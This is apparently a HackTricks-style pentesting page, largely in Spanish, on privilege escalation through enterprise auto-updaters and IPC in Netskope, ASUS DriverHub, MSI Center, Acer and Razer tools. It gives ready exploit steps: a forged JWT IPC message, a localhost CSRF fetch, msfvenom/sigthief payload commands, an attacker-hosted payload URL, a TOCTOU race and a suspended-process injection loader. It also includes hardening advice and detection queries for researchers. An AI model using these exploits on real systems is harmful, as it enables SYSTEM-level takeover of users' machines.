# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza una clase de cadenas de escalada de privilegios locales en Windows encontradas en agentes y actualizadores de endpoints empresariales que exponen una superficie IPC de baja fricción y un flujo de actualización privilegiado. Un ejemplo representativo es Netskope Client for Windows < R129 (CVE-2025-0309), donde un usuario con pocos privilegios puede forzar el registro en un servidor controlado por el atacante y luego entregar un MSI malicioso que instala el servicio SYSTEM.

Ideas clave que puedes reutilizar contra productos similares:
- Abusar de la IPC localhost de un servicio privilegiado para forzar el re-registro o la reconfiguración hacia un servidor atacante.
- Implementar los endpoints de actualización del proveedor, entregar una Trusted Root CA maliciosa y apuntar el updater a un paquete malicioso “signed”.
- Evadir comprobaciones de firmante débiles (CN allow-lists), flags de digest opcionales y propiedades laxas de MSI.
- Si la IPC está “encrypted”, derivar la key/IV desde identificadores de máquina legibles por cualquier usuario almacenados en el registry.
- Si el servicio restringe llamantes por image path/process name, inyectar en un proceso allow-listed o spawnear uno en estado suspended y bootstrappear tu DLL vía un parche mínimo del thread-context.

---
## 1) Forcing enrollment to an attacker server via localhost IPC

Many agents ship a user-mode UI process that talks to a SYSTEM service over localhost TCP using JSON.

Observado en Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flujo de explotación:
1) Crear un token JWT de enrollment cuyos claims controlen el host backend (p. ej., AddonUrl). Usar alg=None para que no se requiera firma.
2) Enviar el mensaje IPC que invoque el comando de provisioning con tu JWT y tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) El servicio empieza a contactar con tu servidor malicioso para enrollment/config, p. ej.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notas:
- Si la verificación del llamador se basa en la ruta/nombre, origina la petición desde un binario del proveedor allow-listed (ver §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Una vez que el cliente se comunique con tu servidor, implementa los endpoints esperados y redirígelo hacia un MSI del atacante. Secuencia típica:

1) /v2/config/org/clientconfig → Devuelve una configuración JSON con un intervalo de actualización muy corto, p. ej.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Devuelve un PEM CA certificate. El servicio lo instala en el Local Machine Trusted Root store.
3) /v2/checkupdate → Proporciona metadata apuntando a un MSI malicioso y una versión falsa.

Evasión de comprobaciones comunes vistas en entornos reales:
- Signer CN allow-list: el servicio puede simplemente verificar que el Subject CN sea “netSkope Inc” o “Netskope, Inc.”. Tu CA rogue puede emitir un certificado leaf con ese CN y firmar el MSI.
- CERT_DIGEST property: incluye una propiedad MSI benigno llamada CERT_DIGEST. No hay enforcement en la instalación.
- Optional digest enforcement: un flag de configuración (p.ej., check_msi_digest=false) desactiva validación criptográfica adicional.

Resultado: el servicio SYSTEM instala tu MSI desde
C:\ProgramData\Netskope\stAgent\data\*.msi
ejecutando código arbitrario como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Desde R127, Netskope envolvió el JSON de IPC en un campo encryptData que parece Base64. El reversing mostró AES con key/IV derivados de valores del registro legibles por cualquier usuario:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Los atacantes pueden reproducir el cifrado y enviar comandos cifrados válidos desde un usuario estándar. Consejo general: si un agente de repente “encrypts” su IPC, busca device IDs, product GUIDs, install IDs bajo HKLM como material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Algunos servicios intentan autenticar al peer resolviendo el PID de la conexión TCP y comparando la ruta/nombre de la imagen contra binarios allow-listed del vendor ubicados bajo Program Files (p.ej., stagentui.exe, bwansvc.exe, epdlp.exe).

Dos bypasses prácticos:
- DLL injection en un proceso allow-listed (p.ej., nsdiag.exe) y proxy IPC desde dentro de él.
- Spawn de un binario allow-listed en estado suspended y bootstrap de tu proxy DLL sin CreateRemoteThread (ver §5) para satisfacer reglas de tamper impuestas por drivers.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Los productos suelen incluir un minifilter/OB callbacks driver (p.ej., Stadrv) para quitar derechos peligrosos de handles hacia procesos protegidos:
- Process: elimina PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restringe a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader en user-mode fiable que respeta estas restricciones:
1) CreateProcess de un binario del vendor con CREATE_SUSPENDED.
2) Obtén handles que aún puedes: PROCESS_VM_WRITE | PROCESS_VM_OPERATION en el proceso, y un handle de thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME si parcheas código en un RIP conocido).
3) Sobrescribe ntdll!NtContinue (u otro thunk temprano garantizado-mapeado) con un pequeño stub que llame a LoadLibraryW sobre la ruta de tu DLL, y luego vuelva.
4) ResumeThread para disparar tu stub en proceso, cargando tu DLL.

Porque nunca usaste PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME sobre un proceso ya protegido (tú lo creaste), la política del driver queda satisfecha.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatiza una rogue CA, el signing de MSI malicioso, y sirve los endpoints necesarios: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope es un IPC client personalizado que construye mensajes IPC arbitrarios (opcionalmente AES-encrypted) e incluye la inyección por proceso suspendido para originar desde un binario allow-listed.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Cuando te enfrentas a un nuevo endpoint agent o a una suite “helper” de motherboard, un flujo rápido suele ser suficiente para determinar si estás ante un objetivo privesc prometedor:

1) Enumerate loopback listeners y mapéalos a procesos del vendor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerar named pipes candidatos:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Extraer datos de enrutamiento respaldados por el registro usados por servidores IPC plugin-based:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extrae primero los endpoint names, JSON keys y command IDs del user-mode client. Packed Electron/.NET frontends frecuentemente leak el esquema completo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
Si el objetivo autentica a los llamantes solo por PID, image path, o process name, trátalo como un obstáculo menor en lugar de una barrera: inyectar en el cliente legítimo, o establecer la conexión desde un proceso en la lista de permitidos, suele ser suficiente para satisfacer las comprobaciones del servidor. Para named pipes específicamente, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub incluye un servicio HTTP en modo usuario (ADU.exe) en 127.0.0.1:53000 que espera llamadas del navegador provenientes de https://driverhub.asus.com. El filtro de Origin simplemente realiza `string_contains(".asus.com")` sobre la cabecera Origin y sobre las URLs de descarga expuestas por `/asus/v1.0/*`. Cualquier host controlado por un atacante como `https://driverhub.asus.com.attacker.tld` por tanto pasa la comprobación y puede emitir solicitudes que cambian el estado desde JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Flujo práctico:
1) Registra un dominio que incluya `.asus.com` y hospeda allí una página web maliciosa.
2) Usa `fetch` o XHR para llamar a un endpoint privilegiado (p. ej., `Reboot`, `UpdateApp`) en `http://127.0.0.1:53000`.
3) Envía el body JSON que espera el manejador – el frontend JS empaquetado muestra el esquema a continuación.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Incluso la PowerShell CLI mostrada a continuación tiene éxito cuando la cabecera Origin se falsifica al valor de confianza:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Cualquier visita del navegador al sitio del atacante se convierte, por tanto, en un CSRF local de 1 clic (o 0 clic vía `onload`) que impulsa un SYSTEM helper.

---
## 2) Verificación insegura de firma de código y clonación de certificados (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` descarga ejecutables arbitrarios definidos en el cuerpo JSON y los cachea en `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validación de la URL de descarga reutiliza la misma lógica basada en subcadenas, por lo que `http://updates.asus.com.attacker.tld:8000/payload.exe` es aceptada. Tras la descarga, ADU.exe únicamente comprueba que el PE contiene una firma y que la cadena Subject coincide con ASUS antes de ejecutarlo – no `WinVerifyTrust`, no validación de la cadena de certificados.

Para explotar el flujo:
1) Crear un payload (p. ej., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clonar el signer de ASUS en él (p. ej., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospedar `pwn.exe` en un dominio similar a `.asus.com` y activar UpdateApp mediante el CSRF del navegador descrito arriba.

Debido a que tanto los filtros Origin como URL se basan en subcadenas y la comprobación del signer compara solo cadenas, DriverHub descarga y ejecuta el binario del atacante bajo su contexto elevado.

---
## 1) TOCTOU dentro de rutas de copia/ejecución del updater (MSI Center CMD_AutoUpdateSDK)

El servicio SYSTEM de MSI Center expone un protocolo TCP donde cada frame es `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. El componente principal (Component ID `0f 27 00 00`) incluye `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Su manejador:
1) Copia el ejecutable suministrado a `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma vía `CS_CommonAPI.EX_CA::Verify` (el subject del certificado debe ser “MICRO-STAR INTERNATIONAL CO., LTD.” y `WinVerifyTrust` debe tener éxito).
3) Crea una tarea programada que ejecuta el archivo temporal como SYSTEM con argumentos controlados por el atacante.

El archivo copiado no queda bloqueado entre la verificación y `ExecuteTask()`. Un atacante puede:
- Enviar un Frame A que apunte a un binario legítimo firmado por MSI (garantiza que la comprobación de firma pase y la tarea quede en cola).
- Competir con él enviando repetidamente mensajes Frame B que apunten a un payload malicioso, sobrescribiendo `MSI Center SDK.exe` justo después de que la verificación finalice.

La explotación fiable usa dos goroutines/hilos que envían repetidamente CMD_AutoUpdateSDK hasta que se gana la ventana TOCTOU.

---
## 2) Abusar de IPC personalizado a nivel SYSTEM e impersonación (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Cada plugin/DLL cargado por `MSI.CentralServer.exe` recibe un Component ID almacenado bajo `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Los primeros 4 bytes de un frame seleccionan ese componente, permitiendo a atacantes enrutar comandos a módulos arbitrarios.
- Los plugins pueden definir sus propios task runners. `Support\API_Support.dll` expone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` y llama directamente a `API_Support.EX_Task::ExecuteTask()` sin **ninguna validación de firma** – cualquier usuario local puede apuntarlo a `C:\Users\<user>\Desktop\payload.exe` y obtener ejecución SYSTEM de forma determinista.
- Sniffear loopback con Wireshark o instrumentar los binarios .NET en dnSpy revela rápidamente el mapeo Componente ↔ comando; clientes personalizados en Go/Python pueden entonces reproducir frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expone `\\.\pipe\treadstone_service_LightMode`, y su ACL discrecional permite clientes remotos (p. ej., `\\TARGET\pipe\treadstone_service_LightMode`). Enviar el command ID `7` con una ruta de archivo invoca la rutina de spawn de procesos del servicio.
- La librería cliente serializa un byte terminador mágico (113) junto con los args. La instrumentación dinámica con Frida/`TsDotNetLib` (ver [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para consejos de instrumentación) muestra que el manejador nativo mapea este valor a un `SECURITY_IMPERSONATION_LEVEL` y a un integrity SID antes de llamar a `CreateProcessAsUser`.
- Cambiar 113 (`0x71`) por 114 (`0x72`) cae en la rama genérica que conserva el token SYSTEM completo y establece un SID de alta integridad (`S-1-16-12288`). El binario lanzado por tanto se ejecuta como SYSTEM sin restricciones, tanto localmente como entre máquinas.
- Combina eso con la bandera expuesta del instalador (`Setup.exe -nocheck`) para levantar ACC incluso en VMs de laboratorio y probar la pipe sin hardware del proveedor.

Estos bugs de IPC subrayan por qué los servicios localhost deben imponer autenticación mutua (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) y por qué el helper de cada módulo que “ejecuta binario arbitrario” debe compartir las mismas verificaciones del signer.

---
## 3) COM/IPC “elevator” helpers respaldados por validación en modo usuario débil (Razer Synapse 4)

Razer Synapse 4 añadió otro patrón útil a esta familia: un usuario de bajo privilegio puede pedir a un helper COM que lance un proceso a través de `RzUtility.Elevator`, mientras la decisión de confianza se delega a una DLL en modo usuario (`simple_service.dll`) en lugar de imponerse de forma robusta dentro del límite privilegiado.

Ruta de explotación observada:
- Instanciar el objeto COM `RzUtility.Elevator`.
- Llamar a `LaunchProcessNoWait(<path>, "", 1)` para solicitar un lanzamiento elevado.
- En el PoC público, la puerta de firma PE dentro de `simple_service.dll` está parcheada antes de emitir la petición, permitiendo que se lance un ejecutable arbitrario elegido por el atacante.

Invocación mínima de PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Conclusión general: cuando realices reversing de suites “helper”, no te quedes limitado a localhost TCP o named pipes. Revisa clases COM con nombres como `Elevator`, `Launcher`, `Updater`, o `Utility`, y luego verifica si el servicio privilegiado realmente valida el binario objetivo por sí mismo o simplemente confía en un resultado calculado por una DLL de cliente en modo usuario que puede parchearse. Este patrón se generaliza más allá de Razer: cualquier diseño dividido donde el broker de alto privilegio consume una decisión allow/deny desde el lado de bajo privilegio es una superficie candidata para privesc.

---
## Secuestro remoto de la cadena de suministro vía validación débil del updater (WinGUp / Notepad++)

Los updaters de Notepad++ basados en WinGUp más antiguos no verificaban completamente la autenticidad de las actualizaciones. Cuando los atacantes comprometían al proveedor de hosting del servidor de actualizaciones, podían manipular el manifiesto XML y redirigir solo a clientes seleccionados a URLs del atacante. Debido a que el cliente aceptaba cualquier respuesta HTTPS sin exigir tanto una cadena de certificados de confianza como una firma PE válida, las víctimas descargaban y ejecutaban un trojanized NSIS `update.exe`.

Flujo operativo (no se requiere exploit local):
1. **Infrastructure interception**: comprometer CDN/hosting y responder a las comprobaciones de actualización con metadatos del atacante apuntando a una URL maliciosa de descarga.
2. **Trojanized NSIS**: el instalador descarga/ejecuta un payload y abusa de dos cadenas de ejecución:
- **Bring-your-own signed binary + sideload**: empaquetar el firmado Bitdefender `BluetoothService.exe` y dejar un `log.dll` malicioso en su search path. Cuando el binario firmado se ejecuta, Windows sideloads `log.dll`, que desencripta y reflectively loads el backdoor Chrysalis (Warbird-protected + API hashing para dificultar la detección estática).
- **Scripted shellcode injection**: NSIS ejecuta un script Lua compilado que usa Win32 APIs (p. ej., `EnumWindowStationsW`) para inject shellcode y stage Cobalt Strike Beacon.

Recomendaciones de hardening/detección para cualquier auto-updater:
- Enforce **certificate + signature verification** del instalador descargado (pin al signer del vendor, rechazar CN/chain no coincidentes) y firmar el propio manifiesto de actualización (p. ej., XMLDSig). Bloquear redirecciones controladas por el manifiesto a menos que estén validadas.
- Tratar **BYO signed binary sideloading** como un pivote de detección post-descarga: alertar cuando un EXE vendor firmado cargue un nombre de DLL desde fuera de su ruta de instalación canónica (p. ej., Bitdefender cargando `log.dll` desde Temp/Downloads) y cuando un updater deje/ejecute instaladores desde temp con firmas no pertenecientes al vendor.
- Monitorizar **malware-specific artifacts** observados en esta cadena (útiles como pivotes genéricos): mutex `Global\Jdhfv_1.0.1`, escrituras anómalas de `gup.exe` a `%TEMP%`, y etapas de Lua-driven shellcode injection.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> iniciando un instalador que no es Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Estos patrones se generalizan a cualquier updater que acepte unsigned manifests o que no fije los installer signers: network hijack + malicious installer + BYO-signed sideloading conducen a remote code execution bajo la apariencia de actualizaciones “trusted”.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
